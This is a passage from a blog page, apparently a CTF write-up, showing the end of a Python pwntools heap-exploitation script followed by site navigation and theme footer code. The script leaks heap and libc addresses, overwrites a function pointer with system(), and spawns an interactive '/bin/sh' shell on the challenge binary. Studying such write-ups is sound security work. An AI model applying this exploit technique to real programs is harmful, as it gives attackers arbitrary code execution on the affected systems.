<span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</div><div class="line">heap_addr = u64(data)</div><div class="line">log.info(<span class="string">'heap addr(): '</span> + hex(heap_addr))</div><div class="line"></div><div class="line">leak_addr = heap_addr + <span class="number">0x770</span></div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x70</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x2b0</span>) + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x00</span> )+ <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x50</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00</span>)+ p64(leak_addr + <span class="number">0x990</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x40</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00</span>)+ p64(<span class="number">0x00</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x30</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x000000000040117b</span>)+ p64(<span class="number">0x30</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x20</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00000000e8150c70</span>)+ p64(<span class="number">0x00</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x20</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00</span>)+ p64(<span class="number">0x00</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">0</span>)</div><div class="line">p.recvuntil(<span class="string">'\x0a'</span>)</div><div class="line">data = p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</div><div class="line">main_arena = u64(data)</div><div class="line"></div><div class="line">log.info(<span class="string">"main_arena : "</span> + hex(main_arena))</div><div class="line"></div><div class="line"><span class="comment">#libc = ELF('./local.libc64')</span></div><div class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</div><div class="line"></div><div class="line"><span class="comment">#libc_base = main_arena - 0x398b58</span></div><div class="line">libc_base = main_arena - <span class="number">0x3BE7B8</span></div><div class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">log.info(<span class="string">"system() addr: "</span> + hex(system_addr))</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(<span class="number">0x602058</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">0</span>, p64(system_addr) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
    

    
</div>


                

                <!-- Post Comments -->
                
                    
                
            </div>

            <!-- Post Prev & Next Nav -->
            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
    <!-- Prev Nav -->
    
        <a href="/2017/03/24/0ctf-2017-writeup/" id="post_nav-newer" class="prev-content">
            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                <i class="material-icons">arrow_back</i>
            </button>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            أحدث
        </a>
    

    <!-- Section Spacer -->
    <div class="section-spacer"></div>

    <!-- Next Nav -->
    
        <a href="/2017/02/04/FSOP以及glibc针对其所做的防御措施/" id="post_nav-older" class="next-content">
            أقدم
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                <i class="material-icons">arrow_forward</i>
            </button>
        </a>
    
</nav>

        </div>
    </div>



                    
                        <!-- Overlay For Active Sidebar -->
<div class="sidebar-overlay"></div>

<!-- Material sidebar -->
<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
    <div id="sidebar-main">
        <!-- Sidebar Header -->
        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
    <!-- Top bar -->
    <div class="top-bar"></div>

    <!-- Sidebar toggle button -->
    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
        <i class="material-icons">clear_all</i>
        <span class="mdl-button__ripple-container">
            <span class="mdl-ripple">
            </span>
        </span>
    </button>

    <!-- Sidebar Avatar -->
    <div class="sidebar-image">
        <img src="/img/avatar.png" alt="DazzleP's avatar">
    </div>

    <!-- Sidebar Email -->
    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
        youremail@email.com
        <b class="caret"></b>
    </a>
</div>


        <!-- Sidebar Navigation  -->
        <ul class="nav sidebar-nav">
    <!-- User dropdown  -->
    <li class="dropdown">
        <ul id="settings-dropdown" class="dropdown-menu">
            
                <li>
                    <a href="#" target="_blank" title="Email Me">
                        
                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
                        
                        Email Me
                    </a>
                </li>
            
        </ul>
    </li>

    <!-- Homepage -->
    
        <li id="sidebar-first-li">
            <a href="/">
                
                    <i class="material-icons sidebar-material-icons">home</i>
                
                الرئيسية
            </a>
        </li>
        
    

    <!-- Archives  -->
    
        <li class="dropdown">
            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
                
                    <i class="material-icons sidebar-material-icons">inbox</i>
                
                    أرشيف
                <b class="caret"></b>
            </a>
            <ul class="dropdown-menu">
            <li>
                <a class="sidebar_archives-link" href="/archives/2017/06/">June 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/05/">May 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/03/">March 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/02/">February 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2016/11/">November 2016<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2016/10/">October 2016<span class="sidebar_archives-count">5</span></a>
            </ul>
        </li>
        
    

    <!-- Categories  -->
    

    <!-- Pages  -->
    

    <!-- Article Number  -->
    
</ul>


        <!-- Sidebar Footer -->
        <!--
I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
It will not impact the appearance and can give developers a lot of support :)

很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
它不会影响美观并可以给开发者很大的支持和动力。 :)
-->

<!-- Sidebar Divider -->

    <div class="sidebar-divider"></div>


<!-- Theme Material -->

    <a href="https://github.com/viosey/hexo-theme-material"  class="sidebar-footer-text-a" target="_blank">
        <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
            سمة - Material
            <span class="sidebar-badge badge-circle">i</span>
        </div>
    </a>


<!-- Help & Support -->
<!--

-->

<!-- Feedback -->
<!--

-->

<!-- About Theme -->
<!--

-->

    </div>

    <!-- Sidebar Image -->
    

</aside>

                    

                    
                        <!-- Footer Top Button -->
                        <div id="back-to-top" class="toTop-wrap">
    <a href="#top" class="toTop">
        <i class="material-icons footer_top-i">expand_less</i>
    </a>
</div>

                    

                    <!--Footer-->
<footer class="mdl-mini-footer" id="bottom">
    
        <!-- Paradox Footer Left Section -->
        <div class="mdl-mini-footer--left-section sns-list">
    <!-- Twitter -->
    
        <a href="https://twitter.com/twitter" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
                <span class="visuallyhidden">Twitter</span>
            </button><!--
     --></a>
    

    <!-- Facebook -->
    
        <a href="https://www.facebook.com/facebook" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn footer-sns-facebook">
                <span class="visuallyhidden">Facebook</span>
            </button><!--
     --></a>
    

    <!-- Google + -->
    
        <a href="https://www.google.com/" target="_blank">
            <button class="mdl-mini-footer--social-btn social-btn footer-sns-gplus">
                <span class="visuallyhidden">Google Plus</span>
            </button><!--
     --></a>
    

    <!-- Weibo -->
    

    <!-- Instagram -->
    

    <!-- Tumblr -->
    

    <!-- Github -->
    

    <!-- LinkedIn -->
    

    <!-- Zhihu -->
    

    <!-- Bilibili -->
    

    <!-- Telegram -->
    
</div>


        <!--Copyright-->
        <div id="copyright">
            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>DazzleP's Blog
        </div>

        <!-- Paradox Footer Right Section -->

        <!--
        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
        It will not impact the appearance and can give developers a lot of support :)

        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
        它不会影响美观并可以给开发者很大的支持。 :)
        -->

        <div class="mdl-mini-footer--right-section">
            <div>
                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
            </div>
        </div>
    
</footer>


                    <!-- Import File -->


    <script>lsloader.load("js/lazyload.min.js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==")</script>
    <script>lsloader.load("js/js.min.js","/js/js.min.js?oAl/+lvaqTFV31JXTmbrNA==")</script>



    <script>lsloader.load("js/nprogress.js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==")</script>


<script type="text/ls-javascript" id="NProgress-script">
    NProgress.configure({
        showSpinner: true
    });
    NProgress.start();
    $('#nprogress .bar').css({
        'background': '#29d'
    });
    $('#nprogress .peg').css({
        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
    });
    $('#nprogress .spinner-icon').css({
        'border-top-color': '#29d',
        'border-left-color': '#29d'
    });
    setTimeout(function() {
        NProgress.done();
        $('.fade').removeClass('out');
    }, 800);
</script>













<!-- UC Browser Compatible -->
<script>
	var agent = navigator.userAgent.toLowerCase();
	if(agent.indexOf('ucbrowser')>0) {
		document.write('<link rel="stylesheet" href="/css/uc.css">');
	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
	}
</script>

<!-- Window Load-->
<script type="text/ls-javascript" id="window-load">
    $(window).on('load', function() {
        // Post_Toc parent position fixed
        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
    });
</script>

<!-- MathJax Load-->

<script type="text/ls-javascript" id="lazy-load">
    // Offer LazyLoad
    queue.offer(function(){
        $('.lazy').lazyload({
            effect : 'show'
        });
    });

    // Start Queue
    $(document).ready(function(){
        setInterval(function(){
            queue.execNext();
        },200);
    });
</script>

<!-- Bing Background -->


<script>
    (function(){
        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')

        for (var i = 0; i < scriptList.length; ++i) {
            var item = scriptList[i];
            lsloader.runInlineScript(item.id,item.id);
        }
    })()
console.log('\n %c © Material Theme | Version: 1.4.0 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
</script>

                </main>
            </div>
        </body>
    
</html>
